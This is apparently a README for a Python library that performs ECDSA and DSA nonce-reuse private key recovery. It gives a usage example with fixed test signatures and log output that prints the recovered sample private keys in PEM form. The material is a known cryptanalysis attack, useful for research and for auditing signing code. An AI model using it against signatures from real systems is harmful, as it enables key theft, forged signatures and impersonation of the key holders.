# ecdsa-key-recovery
A simple library to perform ECDSA and DSA Nonce Reuse private key recovery attacks

This is kind of an improved version of https://github.com/tintinweb/DSAregenK

```python
pub = ecdsa.VerifyingKey.from_string(
        "a50eb66887d03fe186b608f477d99bc7631c56e64bb3af7dc97e71b917c5b3647954da3444d33b8d1f90a0d7168b2f158a2c96db46733286619fccaafbaca6bc".decode(
            "hex"), curve=curve).pubkey
# static testcase
# long r, long s, bytestr hash, pubkey obj.
sampleA = EcDsaSignature((3791300999159503489677918361931161866594575396347524089635269728181147153565,
                          49278124892733989732191499899232294894006923837369646645433456321810805698952),
                         bignum_to_hex(
                             765305792208265383632692154455217324493836948492122104105982244897804317926).decode(
                             "hex"),
                         pub)
sampleB = EcDsaSignature((3791300999159503489677918361931161866594575396347524089635269728181147153565,
                          34219161137924321997544914393542829576622483871868414202725846673961120333282),
                         bignum_to_hex(
                             23350593486085962838556474743103510803442242293209938584974526279226240784097).decode(
                             "hex"),
                         pub)

assert (sampleA.x is None)              # privatekey is not available, attempt to recover it
logger.debug("%r - recovering private-key from nonce reuse ..." % sampleA)
sampleA.recover_nonce_reuse(sampleB)    # recover privatekey shared with sampleB
assert (sampleA.x is not None)          # assert privkey recovery succeeded. This gives us a ready to use ECDSA privkey object
assert sampleA.privkey
logger.debug("%r - Private key recovered! \n%s" % (sampleA, sampleA.export_key()))
```

```python
INFO:__main__:------------EcDSA------------
DEBUG:__main__:<EcDsaSignature 0x2c7a61 sig=(3791300999…,4927812489…) public=✔ private=⨯ > - recovering private-key from nonce reuse ...
DEBUG:__main__:<EcDsaSignature 0x2c7a61 sig=(3791300999…,4927812489…) public=✔ private=✔ > - Private key recovered!
-----BEGIN EC PRIVATE KEY-----
MHQCAQEEIOdzzzX85WfQYiIDwo9nR4ozYbrn5utDZrUOHSfrHtguoAcGBSuBBAAK
oUQDQgAEpQ62aIfQP+GGtgj0d9mbx2McVuZLs699yX5xuRfFs2R5VNo0RNM7jR+Q
oNcWiy8ViiyW20ZzMoZhn8yq+6ymvA==
-----END EC PRIVATE KEY-----

DEBUG:__main__:<EcDsaSignature 0x2c7a5b sig=(3791300999…,4927812489…) public=✔ private=⨯ > - recovering private-key from nonce reuse ...
DEBUG:__main__:<EcDsaSignature 0x2c7a5b sig=(3791300999…,4927812489…) public=✔ private=✔ > - Private key recovered!
-----BEGIN EC PRIVATE KEY-----
MHQCAQEEIOdzzzX85WfQYiIDwo9nR4ozYbrn5utDZrUOHSfrHtguoAcGBSuBBAAK
oUQDQgAEpQ62aIfQP+GGtgj0d9mbx2McVuZLs699yX5xuRfFs2R5VNo0RNM7jR+Q
oNcWiy8ViiyW20ZzMoZhn8yq+6ymvA==
-----END EC PRIVATE KEY-----

INFO:__main__:------------DSA------------
DEBUG:__main__:generated sample signatures: (('\x96.\xed\x06?Tx\x87\x96\xc0Jxe\xc1\xb7\xa0}\xbaSl', (962114315288785318297754502373467834746102876259L, 152066227943132308247866282041325280216845090990L), <_DSAobj @0x2c49a80 y,g,p(1024),q>), ('\xf2\x9a\x9a\x81\xa8\x1b\x071Z1\xe28\xd3\x993\xff\xc7[b\xab', (962114315288785318297754502373467834746102876259L, 357089477795349418794190243474458899186606359757L), <_DSAobj @0x2c788f0 y,g,p(1024),q>))
DEBUG:__main__:Signature Objects: [<DsaSignature 0x2c7a5b sig=(9621143152…,1520662279…) public=✔ private=⨯ >, <DsaSignature 0x2c7a3f sig=(9621143152…,3570894777…) public=✔ private=⨯ >]
DEBUG:__main__:<DsaSignature 0x2c7a5b sig=(9621143152…,1520662279…) public=✔ private=⨯ > - recovering privatekey from nonce reuse...
DEBUG:__main__:<DsaSignature 0x2c7a5b sig=(9621143152…,1520662279…) public=✔ private=✔ > - Private key recovered!
-----BEGIN PRIVATE KEY-----
MIIBSgIBADCCASsGByqGSM44BAEwggEeAoGBAIAAAAAAAAAA8tZboZpqrRAwKtK0
mXxwct7Es1BBih3HheeLBMOHCqPlwJmfUA8kBZQZzu3V+at5IWlRi0fTikvNWuqN
GLqMkf0kqXOhzP8/hD7B/CUF1YedzGKqC2BfhX/RON+CD/mFi35As8G73O29GCUl
qMd0KYhHHtBvVPiLAhUA/5r9a94k/9/mHVub1U0WrAJv2B8CgYARyESPcKSpBEoT
nXlMrX1M71RySJL5nrqUKpFTFRSoIwX5sj7ZRfKSqbf2umwSu8LfCEOZ2qKu0+jp
+bUC0oihSjaVCrADZykPr67k9mt56xx1wP4vUJJNfM3Wkty5xsI3JtUFbQ5EzFAt
JhLRWxOqcGEm35ZPQ4ao1qZsIsSVCQQWAhRqVNUTHGUaRRA5lXlmN4sw9glosQ==
-----END PRIVATE KEY-----
DEBUG:__main__:generated sample signatures: (('\x96.\xed\x06?Tx\x87\x96\xc0Jxe\xc1\xb7\xa0}\xbaSl', (921214889680762780870505834724573810649257487648L, 1206590109737383111438209532388130932310558452933L), <_DSAobj @0x2c78cd8 y,g,p(1024),q>), ('\xf2\x9a\x9a\x81\xa8\x1b\x071Z1\xe28\xd3\x993\xff\xc7[b\xab', (921214889680762780870505834724573810649257487648L, 254170456806936279470958328275930254179957847437L), <_DSAobj @0x2c788f0 y,g,p(1024),q>))
DEBUG:__main__:Signature Objects: [<DsaSignature 0x2c7a83 sig=(9212148896…,1206590109…) public=✔ private=⨯ >, <DsaSignature 0x2c7a61 sig=(9212148896…,2541704568…) public=✔ private=⨯ >]
DEBUG:__main__:<DsaSignature 0x2c7a83 sig=(9212148896…,1206590109…) public=✔ private=⨯ > - recovering privatekey from nonce reuse...
DEBUG:__main__:<DsaSignature 0x2c7a83 sig=(9212148896…,1206590109…) public=✔ private=✔ > - Private key recovered!
-----BEGIN PRIVATE KEY-----
MIIBSwIBADCCASsGByqGSM44BAEwggEeAoGBAIAAAAAAAAAARApDBH1CEeZPeIM9
mMb6l3FyY8+AOy+cdiDzCaqlkIRVIRRxvnCH5oJ6gkinosGscZMTgF7IwQJzDHFm
oxvVdpACrj5Je+kpF6djefAbe+ByZ4FowkGq1EdMZF8aZzsik3CFkEA/vDsjvAsg
XmKRvOnFHkkFuKCRAhUA/+rcmBQ71NBsDzkbusi6NQpTNF8CgYAFVt8xSXTiCGn8
+bqWyoX+gjItArrT28o6fGnq+apjwasvWDHq1FETk/gwqTbTwWTiMo2eOTImRKDF
MbK1us+DjhloAUuhL6nCRQhsLs4Jq+8A/y7aol/HjCz1fHRKKDD9wqKDf2kWdI97
Kb2Hq4AUoJWTCT0ijX+oQJafbywjdwQXAhUAniK/kyRv/SFd1uJjuDMh0EntMws=
-----END PRIVATE KEY-----

```